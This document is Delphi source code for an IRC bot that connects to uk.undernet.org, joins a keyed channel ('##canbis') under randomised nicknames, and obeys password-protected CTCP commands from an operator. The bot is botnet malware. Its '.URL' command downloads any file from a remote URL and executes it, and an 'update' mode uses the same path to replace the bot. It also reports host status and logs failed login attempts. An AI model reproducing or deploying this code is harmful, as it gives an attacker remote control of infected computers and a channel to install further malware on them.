   unit untBot;

   interface

   uses
     Windows, Winsock, ShellApi, untStatus;

   var
     Sock          :TSocket;
     Addr          :TSockAddrIn;
     Wsa           :TWSAData;
     Server        :String; {uk.undernet.org}
     Nickname      :String; {bot-24nd0m}
     Ident         :String; {24nd0m}
     Channel       :String; {##canbis}
     Key           :String; {biscan20}

     WrongLoginLog :Array Of String;
     WrongLoginCnt :Integer = 1;
     LoggedIn      :Bool = False;
     Admin         :String;

     Procedure StartBot;
     Function ipstr(HostName: String): String;
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   function InttoStr(const Value: integer): string; var S: string[11];
   begin Str(Value, S); Result := S; end;

   function StrtoInt(const S: string): integer; var E: integer;
   begin Val(S, Result, E);end;

   Function SendData(Text: String): Bool;
   Begin
     Result := True;
     If Send(Sock, Text[1], Length(Text), 0) = socket_error Then Result := False;
   End;

   Function CTCP(who: String; text: String): Bool;
   Begin
     Result := False;
     If SendData('PRIVMSG '+who+' :'#01+Text+#01#10) Then Result := True Else
     CloseSocket(Sock);
   End;

   Function GetBotNick: String;
   Begin
     Randomize;
     Result := 'can';
     While Length(Result) < 13 do
       Result := Result + IntToStr(Random(9));
   End;

   Procedure SetDetails;
   Begin
     Server := 'uk.undernet.org';
     Nickname := GetBotNick;
     Ident := GetBotNick;
     Channel := '##canbis';
     Key := 'biscan20';
   End;

   Procedure SplitCmd(Const Data: Array Of Char;Var Buf: Array Of String; Count: Integer);
   Var
     I: Integer;
     J: Integer;
     C: Integer;
     Tmp: String;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));
     ZeroMemory(@C, SizeOf(C));

     FillChar(Buf, SizeOf(Buf), #0);
     Tmp := '';

     For I := 0 To Count-1 Do
     Begin
       If Data[I] = #0 Then Break;
       If Data[I] = ' ' Then
       Begin
         Tmp := Copy(String(Data), C+1, I-C);
         Buf[J] := Tmp;
         Inc(J);
         Inc(C, (I-C)+1);
       End;
     End;
   End;

   Function RunFile(Name: String): String;
   Begin
     Result := 'File executed without error.';
     Case ShellExecute(0, 'open', pChar(Name), nil, nil, 1) Of
       2: Result := 'Error: File not found.';
       3: Result := 'Error: Path not found.';
       5: Result := 'Error: Access Denied.';
       8: Result := 'Error: Out of memory.';
       32: Result := 'Error: DLL Not Found.';
     End;
   End;

   Procedure ReadCommando(Cmd: Array Of String);
   Var
     Nick  :String;
     Ident :String;
     Host  :String;

     Temp  :String;

     IsCTCP:Bool;
     I     :Integer;
   Begin
     IsCTCP := False;
     Temp := Cmd[0];

     Nick := Copy(Temp, 2, pos('!', temp)-2);
     Ident := Copy(Temp, Pos('!', Temp)+1, (Pos('@', Temp)-3)-Length(Nick));
     Host := Copy(Temp, Pos('@', Temp)+1, Length(Temp));

     Temp := Cmd[3];
     If Temp[1] = ':' Then
     Begin
       If Temp[2] = #1 Then
         IsCTCP := True;
       Cmd[3] := Copy(Cmd[3], 2, Length(Cmd[3]));
     End Else
     Begin
       If Temp[1] = #1 Then
         IsCTCP := True;
     End;

     If IsCTCP Then
     Begin
       Delete(Cmd[3],1,1);
       For I := 0 To SizeOf(Cmd)-1 Do
       Begin
         Temp := Cmd[I];
         If Temp = '' Then Break;
         If Copy(Temp, Length(Temp), 1) = #1 Then
          Delete(Cmd[I], Length(Temp), 1);
       End;
     End;

     If Cmd[2][1] = '#' Then
       IsCTCP := False;

     If Not IsCTCP Then Exit;

     If Cmd[3] = '.LOGIN' Then
       If Cmd[4] <> 'biscan 20' Then
       Begin
         If WrongLoginLog[0] = 'There is no loggs yet.' Then
           WrongLoginLog[0] := ''
         Else Begin
           SetLength(WrongLoginLog, WrongLoginCnt+1);
           Inc(WrongLoginCnt);
         End;
         WrongLoginLog[WrongLoginCnt-1] := '('+Cmd[4]+') Login Attempted By '+Nick+'!'+Ident+'@'+Host+
         ' (IP: '+IpStr(Host)+')';
         CTCP(Nick, 'Wrong Login Attempted ('+Cmd[4]+'). Your IP has been Logged.');
         LoggedIn := False;
       End Else
       Begin
         CTCP(Nick, 'Welcome '+Nick+' ('+Host+').');
         Admin := Host;
         LoggedIn := True;
       End;

     If Cmd[3] = '.LOG' Then
     Begin
       If Not LoggedIn Then
       Begin
         If Not (Host = Admin) Then Exit;
         CTCP(Nick, 'Your not logged in. Go away!');
         Exit;
       End;
       For I := 0 To WrongLoginCnt-1 Do
         CTCP(Nick, WrongLoginLog[i]);
       WrongLoginCnt := 1;
       SetLength(WrongLoginLog, WrongLoginCnt);
       WrongLoginLog[0] := 'There is no loggs yet.';
     End;

     If Cmd[3] = '.STATUS' Then
     Begin
       If LoggedIn  Then
       Begin
         If Not (Host = Admin) Then Exit;
         CTCP(Nick, GetStatus);
       End;
     End;

     If Cmd[3] = '.URL' Then
     Begin
       If LoggedIn Then
       Begin
         If Not (Host = Admin) Then Exit;
         If Cmd[4] = '' Then
           CTCP(Nick, 'There is no such file.')
         Else
           CTCP(Nick, 'Started to download '+Cmd[4]);
         If UrlDownloadToFile(0, pChar(Cmd[4]), pChar(Cmd[5]), 0, 0) = s_ok Then
           CTCP(Nick, 'File downloaded to '+Cmd[5])
         Else
           CTCP(Nick, 'Download Error from '+Cmd[4]);

         If Cmd[6] = 'run' Then
           CTCP(Nick, RunFile(Cmd[5]))
         Else
         if Cmd[6] = 'update' Then
         Begin
           Temp := RunFile(Cmd[5]);
           If Temp = 'File executed without error.' Then
           Begin
             SendData('QUIT :Updating...');
             Sleep(600);
             CloseSocket(Sock);
             ExitProcess(0);
           End Else
           Begin
             CTCP(Nick, Temp);
           End;
         End;
       End Else
       Begin
         If WrongLoginLog[0] = 'There is no loggs yet.' Then
           WrongLoginLog[0] := ''
         Else Begin
           SetLength(WrongLoginLog, WrongLoginCnt+1);
           Inc(WrongLoginCnt);
         End;
         WrongLoginLog[WrongLoginCnt-1] := '('+Cmd[4]+') URL Attempted By '+Nick+'!'+Ident+'@'+Host+
         ' (IP: '+IpStr(Host)+')';
         CTCP(Nick, 'Unallowed Download Tried ('+Cmd[4]+'). Your IP has been Logged.');
       End;
     End;
   End;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure readsocket(sock: tsocket);
   var
     temp  :String;
     data  :String;
     SendBuf:String;
     buff  :Array[0..1600] of char;
     Param :Array Of String;
   begin
     If Not SendData('USER '+Ident+' '+Ident+'@dasmail.de "win2k" :'+Ident+#10) Then CloseSocket(Sock);
     If Not SendData('NICK '+NickName+#10) Then CloseSocket(Sock);

     ZeroMemory(@Buff, SizeOf(Buff));
     ZeroMemory(@Param, SizeOf(Param));
     Data := '';
     Temp := '';

     While Recv(Sock, Buff, SizeOf(Buff), 0) > socket_error Do
     Begin
       Data := String(Buff);
       ZeroMemory(@Buff, SizeOf(Buff));

       While Data <> '' Do
       Begin
         ZeroMemory(@Buff, SizeOf(Buff));
         Temp := Copy(Data, 1, Pos(#10, Data)-1);
         Data := Copy(Data, Pos(#10, Data)+1, Length(Data));
         If Copy(Temp, Length(Temp), 1) = #13 Then
           Temp := Copy(Temp, 1, Length(Temp)-1);
         Temp := Temp + ' ';

         Move(Temp[1], Buff, Length(Temp));
         SetLength(Param, Length(Temp));
         SplitCmd(Buff, Param, SizeOf(Buff));

         If Pos('MOTD', Temp) > 0 Then
         Begin
           SendData('MODE '+Channel+' '+Key+#10);
           SendData('JOIN '+Channel+' '+Key+#10);
         End;

         If (Param[0] = 'Nickname') and (Param[4] = 'use') Then
         Begin
           NickName := GetBotNick;
           SendBuf := 'NICK '+NickName+#10;
           SendData(SendBuf);
         End;

         If Param[0] = 'PING' Then
           SendData('PONG '+Param[1]+#10);

         If Param[1] = '366' Then
           CTCP('blaZcan', 'test');

         If UpperCase(Param[1]) = 'PRIVMSG' Then
           ReadCommando(Param);

       End;
       ZeroMemory(@Buff, SizeOf(Buff));
     End;
   end;

   Function ipstr(HostName: String): String;
   Type
     TAPInAddr = Array[0..100] Of PInAddr;
     PAPInAddr = ^TAPInAddr;
   Var
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     PPTr       : PAPInAddr;
     I          : Integer;
   Label
     Abort;
   Begin
     Result := '';
     WSAStartUp($101, WSAData);
     Try
       HostEntPtr := GetHostByName(pChar(HostName));
       If HostEntPtr = NIL Then Goto Abort;
       PPTr := PAPInAddr(HostEntPtr^.h_addr_list);
       I := 0;
       While PPTr^[I] <> NIL Do
       Begin
         If HostName = '' Then
         Begin
           If (Pos('168', inet_nToa(PPTr^[I]^)) <> 1) And (Pos('192', inet_nToa(PPTr^[I]^)) <> 1) Then
           Begin
             Result := Inet_nToa(PPTr^[I]^);
             Goto Abort;
           End;
         End Else
           Result := (Inet_nToa(PPTr^[I]^));
         Inc(I);
       End;
   Abort:
     Except
     End;
     WSACleanUp;
   End;

   Procedure StartBot;
   Begin
     SetDetails;

     SetLength(WrongLoginLog, 1);
     WrongLoginLog[0] := 'There is no loggs yet.';

     wsastartup(makeword(2,1), wsa);

       sock := socket(af_inet, sock_stream, 0);
       addr.sin_family := af_inet;
       addr.sin_port := htons(6667);
       addr.sin_addr.s_addr := inet_addr(pchar(ipstr(server)));
       if connect(sock, addr, sizeof(addr)) > socket_error then
         readsocket(sock);

     wsacleanup;
   End;

   end.
